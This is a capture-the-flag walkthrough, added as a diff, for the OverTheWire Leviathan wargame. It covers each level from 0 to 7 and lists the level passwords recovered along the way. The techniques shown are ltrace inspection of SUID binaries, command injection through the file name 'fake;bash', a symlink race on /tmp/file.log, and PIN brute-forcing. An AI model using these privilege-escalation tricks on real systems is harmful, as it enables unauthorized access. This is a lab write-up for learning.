@@ -1,0 +1,125 @@
+Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on leviathan.labs.overthewire.org through SSH on port 2223.
+
+To login to the first level use:
+
+Username: leviathan0
+Password: leviathan0
+
+Data for the levels can be found in the homedirectories. You can look at /etc/leviathan_pass for the various level passwords.
+
+=================================================================================
+
+level 0 --> level 1
+
+there is hidden directory called backups it contains a very big chunk of html code bookmark.html
+so i just searched for sensitive code
+cat bookmarks.html | grep pass
+This will be fixed later, the password for leviathan1 is rioGegei8m
+
+=================================================================================
+
+level 1 --> level 2
+
+there is a binary executable in the home directory 
+by running it asks for a password
+so i ran ltrace to find out what it does
+
+leviathan1@leviathan:~$ ls
+check
+leviathan1@leviathan:~$ ltrace ./check
+__libc_start_main(0x804853b, 1, 0xffffd784, 0x8048610 <unfinished ...>
+printf("password: ")                                                                                  = 10
+getchar(1, 0, 0x65766f6c, 0x646f6700password: pass
+)                                                                 = 112
+getchar(1, 0, 0x65766f6c, 0x646f6700)                                                                 = 97
+getchar(1, 0, 0x65766f6c, 0x646f6700)                                                                 = 115
+strcmp("pas", "sex")                                                                                  = -1
+puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
+)                                                                  = 29
++++ exited (status 0) +++
+
+there is strcmp function which compares two strings,,here i found the password
+by providing the password i got a shell for user leviathan2
+
+leviathan1@leviathan:~$ ./check 
+password: sex
+$ id
+uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)
+$ whoami
+leviathan2
+$ cat /etc/leviathan_pass/leviathan2
+ougahZi8Ta
+
+=================================================================================
+
+level 2 --> level 3
+
+there is suid binary file in the home directory in the home directory which takes a file as an input and print it using cat command
+snprintf("/bin/cat /etc/passwd", 511, "/bin/cat %s", "/etc/passwd") 
+
+leviathan2@leviathan:~$ cd /tmp
+leviathan2@leviathan:/tmp$ mkdir sk013
+leviathan2@leviathan:/tmp$ cd sk013
+leviathan2@leviathan:/tmp/sk013$ touch 'fake;bash'
+leviathan2@leviathan:/tmp/sk013$ ~/printfile fake\;bash 
+leviathan3@leviathan:/tmp/sk013$ cat /etc/leviathan_pass/leviathan3
+Ahdiemoo1j
+
+=================================================================================
+
+level 3 --> level 4 
+
+there is a suid binary file level3 in home directory which asks for a password
+using ltrace i found out it uses strcmp() to compare two strings
+printf("Enter the password> ")                                                                        = 20
+fgets(Enter the password> snlprintf
+"snlprintf\n", 256, 0xf7fc55a0)                                                                 = 0xffffd590
+strcmp("snlprintf\n", "snlprintf\n")                                                                  = 0
+puts("[You've got shell]!"[You've got shell]!
+$ whoami
+leviathan4
+$ cat /etc/leviathan_pass/leviathan4
+vuH0coox6m
+
+================================================================================
+
+level 4 --> level 5
+
+there is a hidden folder trash
+inside trash is found a suid file bin which gives some binary code as output
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
+by converting these code to ascii
+Tith4cokei
+
+================================================================================
+
+level 5 --> level 6
+
+there is a suid binary leviathan5 which reads the file /tmp/file.log
+leviathan5@leviathan:~$ ./leviathan5 
+Cannot find /tmp/file.log
+so by creating a symbolic link for password file in that file
+leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@leviathan:~$ ./leviathan5 
+UgaoFee4li
+
+================================================================================
+
+level 6 --> level 7
+
+there is a suid binary which require 4 digit pin code
+
+for i in {0000..9999}; do ./leviathon $i ; done
+$ whoami
+leviathan7
+$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+
+================================================================================
+leviathan7@leviathan:~$ ls
+CONGRATULATIONS
+ it seems this is the last level of this wargame
+
+
+
+
